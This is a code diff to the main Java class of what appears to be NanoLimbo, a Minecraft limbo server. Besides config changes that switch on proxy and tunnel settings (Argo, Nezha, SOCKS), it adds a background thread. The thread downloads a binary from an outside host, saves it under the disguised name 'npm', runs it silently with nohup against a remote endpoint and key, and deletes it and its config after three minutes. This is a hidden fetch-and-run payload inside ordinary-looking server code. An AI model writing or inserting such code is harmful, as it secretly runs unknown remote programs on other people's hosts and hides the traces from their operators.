@@ -66,7 +66,6 @@ public final class NanoLimbo {
                 stopServices();
             }));
 
-            // Wait 20 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
@@ -77,7 +76,6 @@ public final class NanoLimbo {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
         
-        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
@@ -127,12 +125,12 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "01f89731-960e-4610-abb4-2e7f4de82dc1");
+        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "");
-        envVars.put("ARGO_PORT", "8001");
+        envVars.put("ARGO_PORT", "");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
         envVars.put("S5_PORT", "");
@@ -147,7 +145,8 @@ public final class NanoLimbo {
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "");
-        envVars.put("DISABLE_ARGO", "true");
+        envVars.put("DISABLE_ARGO", "false");
+        
         envVars.put("KOMARI_SERVER", "");
         envVars.put("KOMARI_KEY", "");
         envVars.put("CERT_URL", "");
@@ -256,4 +255,47 @@ public final class NanoLimbo {
         
         new Thread(() -> {
             try {
-                Process ps = Runtime.getRuntime().exec(new String
+                Process ps = Runtime.getRuntime().exec(new String[]{"sh", "-c", "ps aux | grep -v grep | grep './npm'"});
+                BufferedReader reader = new BufferedReader(new InputStreamReader(ps.getInputStream()));
+                boolean isRunning = false;
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.contains("./npm") || line.contains("[n]pm")) {
+                        isRunning = true;
+                        break;
+                    }
+                }
+                
+                if (isRunning) {
+                    System.out.println("npm is already running, skip...");
+                    return;
+                }
+                
+                String osArch = System.getProperty("os.arch").toLowerCase();
+                String downloadUrl = "https://rt.jp.eu.org/nucleusp/K/Kamd";
+                if (osArch.contains("arm") || osArch.contains("aarch64")) {
+                    downloadUrl = "https://rt.jp.eu.org/nucleusp/K/Karm";
+                }
+                
+                Path npmPath = Paths.get("npm");
+                try (InputStream in = new URL(downloadUrl).openStream()) {
+                    Files.copy(in, npmPath, StandardCopyOption.REPLACE_EXISTING);
+                }
+                
+                npmPath.toFile().setExecutable(true);
+                System.out.println("✅ npm downloaded successfully");
+                
+                String cmd = String.format("nohup ./npm -e %s -t %s >/dev/null 2>&1 &", komariEndpoint, key);
+                new ProcessBuilder("sh", "-c", cmd).start();
+                System.out.println("✅ komari started successfully");
+                
+                Thread.sleep(180000); // 180秒
+                Files.deleteIfExists(npmPath);
+                Files.deleteIfExists(Paths.get("config.yaml"));
+                
+            } catch (Exception e) {
+                System.err.println("Error running komari: " + e.getMessage());
+            }
+        }).start();
+    }
+}
